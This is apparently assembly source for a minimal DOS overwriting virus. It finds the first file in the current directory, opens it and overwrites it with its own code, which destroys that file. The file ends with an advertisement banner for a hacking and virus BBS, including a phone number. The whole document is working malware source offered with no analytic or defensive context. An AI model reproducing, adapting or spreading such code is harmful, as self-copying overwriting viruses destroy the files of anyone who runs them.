code            segment
                assume  cs:code,ds:code,es:code,ss:code
                org     100h
main            proc    near
                mov     dx,offset(nev)         ; offset to '*.*'
                mov     ah,4Eh
                int     21h                    ; find first
                mov     dx,009Eh
                mov     ax,3D01h               ; writing
                int     21h                    ; open a file
                mov     bx,ax
                mov     ah,40h
                mov     cl,offset(nev)-100h+4  ; byte-szam
                mov     dx,100h
                int     21h                    ; write to file
nev: DB         '*.*'
DB              0h
main            endp
code            ends
                end     main

;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;
;컴컴컴컴컴컴컴컴컴> and Remember Don't Forget to Call <컴컴컴컴컴컴컴컴컴;
;컴컴컴컴컴컴> ARRESTED DEVELOPMENT +31.79.426o79 H/P/A/V/AV/? <컴컴컴컴컴;
;컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴컴�;

